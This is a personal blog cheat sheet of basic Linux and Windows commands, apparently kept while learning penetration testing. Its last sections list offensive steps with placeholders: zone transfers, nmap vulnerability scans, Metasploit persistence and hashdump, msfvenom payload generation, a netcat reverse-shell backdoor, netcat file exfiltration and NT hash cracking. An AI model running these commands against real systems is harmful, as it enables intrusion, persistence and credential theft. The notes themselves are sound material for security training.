---
layout: post
title: "Basics Cheat Sheet"
date: 2017-09-05
---
<p>
Here is a formatted list of basic commands. I used these as I was learning how to get my way around and added to the list as I learned new things. Writing them down helped me remember the syntax.
</p>
<h2> Get Help … and other info</h2>
<ul>
	<strong>
		<li><code>C:\&gt; &lt;command&gt; /? </code></li>
		<li><code>root@kl~# &lt;command&gt; -h </code></li>
		<li><code>root@kl~# &lt;command&gt; --help </code></li>
		<li><code>root@kl~# man &lt;command&gt; </code></li>
		<li><code>root@kl~# apropos </code></li>
		<li><code>root@kl~# history </code></li>
		<li><code>root@kl~# hostname</code></li>
		<li><code>root@kl~# sudo </code></li>
		<li><code>root@kl~# whoami </code></li>
	</strong>
			<ul>
				<li>(print current user id and name)</li>	
			</ul>
	<strong>
		<li><code>root@kl~# date </code></li> 
		<li><code>C:\>  chdir </code></li>
	</strong>
			<ul>
				<li>(displays location)</li>
			</ul>
	<strong>
		<li><code>root@kl~# pwd </code></li>
	</strong>
			<ul>
				<li>(displays location)</li>
			</ul>
</ul>

<h2>Processes and Things</h2>
<ul>
	<strong>
		<li><code>root@kl~# jobs </code></li>
	</strong>
			<ul>
				<li>(list cronjobs)</li>
			</ul>
	<strong>
		<li><code>root@kl~# kill </code></li>
	</strong>
			<ul>
				<li>(stop processes)</li>
			</ul>
	<strong>
		<li><code>root@kl~# pkill </code></li>
	</strong>
			<ul>
				<li>(stop processes)</li>
			</ul>
	<strong>	
		<li><code> root@kl~# ps –aef </code></li>
	</strong>
			<ul>
				<li>(list processes status)</li>
			</ul>
	<strong>
		<li><code>C:\ tasklist </code></li>
	</strong>
</ul>

<h2>Files</h2>
<ul>
	<strong>
		<li><code>root@kl~# cp &lt;src&gt; &lt;dst&gt; </code></li>
	</strong>
			<ul>		
				<li>(copy)</li>
			</ul>
	<strong>
		<li><code>C:\> copy  &lt;src&gt; &lt;dst&gt; </code></li>
		<li><code>root@kl~# clear </code></li>
		<li><code>C:\> cls </code></li>
		<li><code>C:\> dir </code></li>
		<li><code>root@kl~# echo &lt;message&gt; </code></li>
	</strong>
			<ul>
				<li>(print to screen)</li>
			</ul>		
	<strong>
		<li><code>root@kl~# find –iname &lt;file&gt; </code></li>
		<li><code>C:\> findstr /i /s &lt;string&gt; *.txt </code></li>
	</strong>
			<ul>
				<li>(like grep for Windows)</li>
			</ul>
	<strong>
		<li><code>root@kl~# file </code></li>
	</strong>
			<ul>
				<li>(determine file type)</li>
			</ul>
	<strong>
		<li><code>C:\> dir \ &lt;file&gt; /b /s </code></li>
		<li><code>root@kl~# grep </code></li>
	</strong>
			<ul>
				<li>(search files for matching text)</li>
			</ul>
	<strong>
			<li><code>root@kl~# gzip </code></li>
	</strong>
			<ul>
				<li>(compress or decompress files)</li>
			</ul>
	<strong>
		<li><code>root@kl~# less </code></li>
	</strong>
		<ul>
			<li>(display output one screen at a time)</li>
		</ul>
	<strong>
		<li><code>root@kl~# locate </code></li>
		<li><code>root@kl~# ls </code></li>
		<li><code>root@kl~# mkdir </code></li>
	</strong>
			<ul>
				<li>(new directory)</li>
			</ul>	
	<strong>
		<li><code>root@kl~# mv &lt;src&gt; &lt;dst&gt; </code></li>
	</strong>
			<ul>
				<li>(move/rename a file)</li>
			</ul>
	<strong>
		<li><code>C:\>  move &lt;src&gt; &lt;dst&gt; </code></li>
		<li><code>root@kl~# rm </code></li> 
	</strong>
			<ul>
				<li>(remove files)</li>
			</ul>	
	<strong>
		<li><code>C:\> ren </code></li>
	</strong>
			<ul>
				<li>(renames file)</li>
			</ul>	
	<strong>
		<li><code>root@kl~# umask </code></li>
	</strong>
			<ul>
				<li>(users file creation mask)</li>
			</ul>	
	<strong>
		<li><code>root@kl~# uniq </code></li>
	</strong>
			<ul>
				<li>(uniquify files)</li>
			</ul>
	<strong>
		<li><code>root@kl~# vi/vim </code></li>
	</strong>
			<ul>
				<li>(the best text editor)</li>
			</ul>	
	<strong>
		<li><code>root@kl~# wc </code></li>
	</strong>
			<ul>
				<li>(print byte, word and line counts)</li>
			</ul>	
	<strong>
		<li><code>root@kl~# whereis </code></li>
	</strong>
			<ul>
				<li>(search $path, man pages and source files for program)</li>
			</ul>	
</ul>
		
<h2>Users</h2>
<ul>
<strong>
	<li><code>root@kl~# chgrp </code></li>
</strong>
		<ul>
			<li>(change group ownership)</li>
		</ul>	
<strong>
	<li><code>root@kl~# chmod </code></li>
</strong>	
		<ul>
			<li>(change access permissions)</li>
		</ul> 
<strong>
	<li><code>root@kl~# chown </code></li>
</strong>	
		<ul>
			<li>(change file owner and group)</li>
		</ul>	
<strong>
	<li><code>root@kl~# groupadd </code></li>
</strong>	
		<ul>
			<li>(add a user to a security group)</li>
		</ul>	
<strong>
	<li><code>root@kl~# passwd </code></li>
</strong>	
		<ul>
			<li>(modify user password)</li>
		</ul>	
<strong>
	<li><code>root@kl~# useradd </code></li>
</strong>	
		<ul>
			<li>(create new users)</li>
		</ul>	
<strong>
	<li><code>root@kl~# usermod </code></li>
</strong>	
		<ul>
			<li>(modify user account)</li>
		</ul>	
<strong>
	<li><code>root@kl~# users </code></li>
</strong>	
		<ul>
			<li>(list logged in users)</li>
		</ul>
</ul>

<h2>Networks</h2>
<ul>
<strong>
	<li><code>root@kl~# curl </code></li>
</strong>
		<ul>
			<li>(grab webpages)</li>
		</ul>
<strong>
	<li><code>root@kl~# dig </code></li>
</strong>
		<ul>
		<li>(DNS lookup)</li>
		</ul>
<strong>
	<li><code>root@kl~# ifconfig </code></li>
	<li><code>root@kl~# netstat -ano/-plant/-uplant </code></li>
</strong>
		<ul>
			<li>(networking connections)</li>
		</ul>
<strong>
	<li><code>root@kl~# nslookup </code></li>
</strong>
		<ul>
			<li>(query name servers)</li>
		</ul>
<strong>
	<li><code>root@kl~# ping </code></li>
	<li><code>root@kl~# ssh </code></li>
	<li><code>root@kl~# traceroute </code></li>
	<li><code>root@kl~# wget </code></li>
</strong>
		<ul>
			<li>(get web pages or files)</li>
		</ul>
 </ul>
 <h1> please excuse my mess...still formatting. Had to go! </h1>
 
<h2>Reconnaissance</h2>
<ul>
<li><code>nslookup &lt;domain&gt; </code></li>
	Discover target’s IP/FQDN domain
<li><code>nslookup &lt;ip&gt; </code></li>
<li><code>root@kl~# dig &lt;domain&gt;  </code></li>
	Find nameserver for known domain
<li><code>root@kl~# dig axfr @&lt;name server&gt; <domain> </code></li>
	perform a zone transfer to list hosts w/in domain
<li><code>root@kl~# traceroute &lt;ip&gt; </code></li>
		determine route to a host
<li><code>C:\> tracert &lt;ip&gt; </code></li>
		determine route to a host
<li><code>root@kl~# nmap –sV –O &lt;ip&gt; </code></li>
	scan for services and operating system
<li><code>root@kl~# nmap --script=vulns &lt;ip&gt; </code></li>
	scan for some old vulns
	
<h2>Gain and Maintain</h2>
establish ssh connection
	root@kl~# ssh <user>@<ip>
remote desktop (rdesktop is port 3389 and vncviewer is 5900)
	rdesktop -u <username> -p <password> <ip>
	vncviewer <ip>
favorites from the msf console
	search <keyword>
	info <module> 
	use <module>
	show options (shows you what to fill in)
	show payloads (shows payloads associated with the exploit you loaded)
	background (use to background sessions)
	pwd vs lpwd & cd vs lcd
	sessions –i <#>  (to interact with sessions)
	run persistence –h 
	run persistence –A –r <your ip> -p <port> -i 10 (call back every 10 seconds if connection is lost)
	hashdump
add a route in msf
	route add <victim subnet> <subnet mask> <session#>
	route print
make a msfvenom payload for windows executable
	root@kl~# msfvenom –p <payload> lhost=<ip> lport=<port> -f exe –i 2 > <file>.exe
	root@kl~# msfvenom –l encoders (for list of encoders)
	set up a listener in metasploit
		use exploit/multi/handler
		set payload
		set ExitOnSession false
		exploit –j (run as a job)
netcat backdoor
	root@kl~# nc –l –p <port> (on launch platform)
	C:\> start nc <launch ip> <port> -e cmd.exe
Escalate and Propagate
get passwords using meterpreter or shell (/etc/shadow or hashdump)
use john to crack NT hashes – remember to add special words you find to the password list in john
	root@kl~# ./john <file> --format=nt
transfer files with netcat
	root@kl~#  nc –l –p <port> > <file> (on your platform to listen for file)
	C:\> nc.exe <your ip> <port>  <  <file to transfer>
transfer files with python
	python –m SimpleHTTPServer <port>
